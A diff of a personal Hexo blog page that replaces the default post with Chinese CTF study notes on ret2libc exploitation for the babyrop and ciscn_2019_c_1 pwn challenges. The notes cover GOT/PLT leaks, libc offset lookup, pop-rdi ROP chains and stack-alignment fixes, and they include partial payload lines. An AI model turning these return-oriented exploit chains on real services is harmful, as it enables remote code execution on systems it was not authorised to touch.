@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, David&#39;s blog">
+    <meta name="keywords" content="libc题, David&#39;s blog">
     <meta name="description" content="�Ǻ��ǻ�������һ�����ˡ�">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | David&#39;s blog</title>
+    <title>libc题 | David&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">libc题</h1>
                 </div>
             </div>
         </div>
@@ -429,9 +429,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -464,19 +468,103 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span>
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+                <h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="OGeek2019]babyrop"></a>OGeek2019]babyrop</h1><h2 id="32位的"><a href="#32位的" class="headerlink" title="32位的"></a>32位的</h2><ul>
+<li>找后门地址,可以发现不存在。而且开启了NX保护，这就要使用libc泄露system·函数<blockquote>
+<p>write_plt_addr = e.plt[“write”]<br>write_got_addr = e.got[“write”]<br>main_addr = e.symbols[“main”]</p>
+</blockquote>
+<h2 id="plt存放的是进入这个函数的函数地址"><a href="#plt存放的是进入这个函数的函数地址" class="headerlink" title="plt存放的是进入这个函数的函数地址"></a>plt存放的是进入这个函数的函数地址</h2><h2 id="got表中存放的是这个函数的真正地址。"><a href="#got表中存放的是这个函数的真正地址。" class="headerlink" title="got表中存放的是这个函数的真正地址。"></a>got表中存放的是这个函数的真正地址。</h2><h3 id="为什么不直接使用system在got表中的地址，而使用在plt表中的地址？"><a href="#为什么不直接使用system在got表中的地址，而使用在plt表中的地址？" class="headerlink" title="为什么不直接使用system在got表中的地址，而使用在plt表中的地址？"></a>为什么不直接使用system在got表中的地址，而使用在plt表中的地址？</h3></li>
+<li>在secure函数中，调用了一次system函数，但是main中却没有调用secure函数，所以got表中就不会有system函数地址。</li>
+<li>函数调用栈，栈帧格式：</li>
+<li><ul>
+<li>高地址</li>
+</ul>
+</li>
+<li><ul>
+<li>参数</li>
+</ul>
+</li>
+<li><ul>
+<li>返回地址</li>
+</ul>
+</li>
+<li><ul>
+<li>ebp</li>
+</ul>
+</li>
+<li><ul>
+<li>局部变量</li>
+</ul>
+</li>
+<li><ul>
+<li>esp</li>
+</ul>
+</li>
+<li><ul>
+<li>低地址</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>payload的构造</li>
+</ul>
+<ul>
+<li>payload的各部分顺序是：函数地址+返回地址+参数地址<blockquote>
+<p>offset = 0x88 + 4 #填充内容以及覆盖ebp<br>payload = offset*b‘a’   </p>
+</blockquote>
+</li>
+</ul>
+<p>+p32(write_plt_addr)    跳转到write函数<br>+p32(main_addr)         这个是write函数的返回地址<br>+p32(1) + p32(write_got_addr) + p32(4)  这个是write的三个参数</p>
+<ul>
+<li>之后就可以运行完write函数，得到目标地址，又返回到主函数继续。</li>
+<li>打印出write函数的地址以后，利用后三位用<a target="_blank" rel="noopener" href="https://libc.blukat.me/">这个网站</a>来查询libc版本以此来获取函数的偏移量。</li>
+<li>找到偏移量以后，接下来就是利用公式函数的真正地址 = 函数偏移地址 + 基地址。来获得基地址，以此来获得system函数的真正地址<blockquote>
+<p>write_offset = 0x000DD460<br>system_offset = 0x040310<br>binsh_offset = 0x162D4C</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>base_addr = write_addr - write_offset<br>system_addr = base_addr + system_offset<br>binsh_addr = base_addr + binsh_offset</p>
+</blockquote>
+<ul>
+<li>再在下一个有溢出风险的地方构造payload，经典溢出到system函数中，参数是bin/sh的地址<h1 id="ciscn-2019-c-1-1"><a href="#ciscn-2019-c-1-1" class="headerlink" title="ciscn_2019_c_1 1"></a>ciscn_2019_c_1 1</h1><h2 id="64位的"><a href="#64位的" class="headerlink" title="64位的"></a>64位的</h2><blockquote>
+<p>puts_addr = u64(r.recvuntil(’\x7f’)[-6:].ljust(8,”\x00”))<br>这个是为了补充字节，u64位要八位，减去‘\n’后就只有6位了<br>接收从7f之前的6位，然后不足的用0补充（ljust（8，“、x00”））</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>不同之处②，64位需要字节数对齐，所以你需要加入一个ret_addr 地址（这个有些不需要，有些不需要。一般buuctf的不需要，ctfshow的需要）</p>
+</blockquote>
+<blockquote>
+<p>64位与32位程序不同①，64位是先传参，而32是栈里面传参是后传参。64位程序的参数从左到右依次放入寄存器: rdi, rsi, rdx, rcx, r8, r9中。在传参时先需要确定这个参数的位置<br>命令为：<br>ROPgadget –binary ./pwn –only “pop|ret”<br>puts函数只有一个参数，只需要 rdi 地址就行了<br>就去找 pop r15 ; ret这样的，借用一个寄存器就好了<br>64位需要字节数对齐，所以你需要加入一个ret_addr 地址<br><img src="libc1.png" alt="Alt text"></p>
+</blockquote>
+<ul>
+<li>payload1=”A”*88  </li>
+</ul>
+<p>+p64(pop_rdi_addr)   借用寄存器<br>+p64(puts_got)       给寄存器传值<br>+p64(puts_plt)       传入函数地址<br>+p64(start_addr)     传入返回地址<br>(之后就可以用rdi自动传入puts)</p>
+<ul>
+<li>此时的esp正处于函数返回的状态，即从上往下走。   </li>
+<li>当esp指向pop rdi ;ret时，<br>rip指向puts_got，<br>puts_got所保存的真实地址就能弹到rdi上。<br>以上是准备参数。</li>
+<li>再往下就是是固定格式“函数地址+返回地址+参数”的体现：<br>利用puts_plt作为函数地址，把start函数作为返回地址，系统会自动读取rdi内容作为参数。<br><img src="libc2.png" alt="Alt text"></li>
+<li>这个也是一样的哦，找一个寄存器，再往寄存器里面填值</li>
+<li>payload2=”A”*88+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)</li>
+</ul>
+<h1 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h1><ul>
+<li>在ubuntu18以上的版本，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。<br><img src="balance.png" alt="Alt text"></li>
+<li>跟进callsystem中的system函数，有一个指令要求rsp+0x40的值是16字节对齐。<blockquote>
+<p>$rsp+0x40没有16字节对齐。<br>0x4F2F6处的movaps [rsp+198h+var_158], xmm0指令要求rsp+198h+var_158的值是对齐16byte（0x10），否则会直接触发中断从而crash。 </p>
+</blockquote>
+</li>
+</ul>
+<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><h2 id="核心思想就是改变栈的地址。"><a href="#核心思想就是改变栈的地址。" class="headerlink" title="核心思想就是改变栈的地址。"></a>核心思想就是改变栈的地址。</h2><ol>
+<li><p>改变payload长度<br>直接更改我们的payload长度，在栈溢出的时候栈的地址自然不同，然后将栈地址+1，如果不行的话，就继续增加，最多也就改16次就一定会遇到栈对齐的情况。</p>
+</li>
+<li><p>栈转移<br>当payload有长度限制的时候，我们可以尝试进行栈转移来进行栈地址的改变，如果遇到了没有对齐的情况就继续将栈地址+1，直到遇到栈对齐的情况。<br>更改payload长度，再添加一个任意的ret指令（不是同一个函数的ret也行）。</p>
+</li>
+</ol>
+<p>emm就先记住要多加一个ret吧</p>
+<ul>
+<li>payload2=’a’*(0xc+8)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</li>
+</ul>
 
                 
             </div>
@@ -503,7 +591,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Davidzwy.github.io/2021/06/20/hello-world/">https://Davidzwy.github.io/2021/06/20/hello-world/</a>
+                    <a href="https://Davidzwy.github.io/2021/06/20/libc/">https://Davidzwy.github.io/2021/06/20/libc/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -540,7 +628,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -710,62 +802,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/06/20/1/">
+                <a href="/2021/06/20/libc/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="pwn一点一点概括">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="libc题">
                         
-                        <span class="card-title">pwn一点一点概括</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            David
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/06/20/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">libc题</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -787,6 +835,59 @@
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/06/20/%E5%9F%BA%E7%A1%80%E5%87%BD%E6%95%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="pwn库函数">
+                        
+                        <span class="card-title">pwn库函数</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            David
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
